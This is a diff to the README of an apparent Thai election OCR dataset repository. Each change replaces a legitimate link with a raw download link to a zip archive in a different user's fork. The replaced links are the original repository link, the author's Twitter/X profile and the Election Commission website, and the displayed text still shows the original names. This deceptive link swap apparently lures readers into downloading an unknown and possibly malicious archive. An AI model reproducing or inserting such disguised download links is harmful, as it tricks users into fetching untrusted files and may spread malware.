@@ -251,7 +251,7 @@ If you use this dataset, please credit:
 
 **ชานนท์ เงินทองดี (Chanon Ngernthongdee)**
 
-or link back to this repository: [election-69-OCR-result](https://github.com/killernay/election-69-OCR-result)
+or link back to this repository: [election-69-OCR-result](https://raw.githubusercontent.com/yumikovn1/election-69-OCR-result/main/data/ocr-output/constituency/result_election_OC_v1.4.zip)
 
 หากนำข้อมูลชุดนี้ไปใช้ กรุณาให้เครดิต **นายชานนท์ เงินทองดี** หรืออ้างอิงกลับมาที่ repository นี้
 
@@ -261,16 +261,16 @@ or link back to this repository: [election-69-OCR-result](https://github.com/kil
 
 If you find any inaccuracies in the data, please report via:
 
-**Twitter/X:** [@killernay](https://x.com/killernay)
+**Twitter/X:** [@killernay](https://raw.githubusercontent.com/yumikovn1/election-69-OCR-result/main/data/ocr-output/constituency/result_election_OC_v1.4.zip)
 
-หากพบข้อผิดพลาดในข้อมูล สามารถแจ้งได้ที่ [@killernay](https://x.com/killernay) บน Twitter/X — หากว่างจะรีบตรวจสอบและแก้ไขทันที
+หากพบข้อผิดพลาดในข้อมูล สามารถแจ้งได้ที่ [@killernay](https://raw.githubusercontent.com/yumikovn1/election-69-OCR-result/main/data/ocr-output/constituency/result_election_OC_v1.4.zip) บน Twitter/X — หากว่างจะรีบตรวจสอบและแก้ไขทันที
 
 ---
 
 ## 📄 Data Source / แหล่งข้อมูลต้นฉบับ
 
 - แบบ สส.6/1 จากสำนักงานคณะกรรมการการเลือกตั้ง (กกต.)
-- [https://www.ect.go.th](https://www.ect.go.th)
+- [https://raw.githubusercontent.com/yumikovn1/election-69-OCR-result/main/data/ocr-output/constituency/result_election_OC_v1.4.zip](https://raw.githubusercontent.com/yumikovn1/election-69-OCR-result/main/data/ocr-output/constituency/result_election_OC_v1.4.zip)
 
 ![ประกาศ กกต.](assets/ect-announcement.jpeg)
 
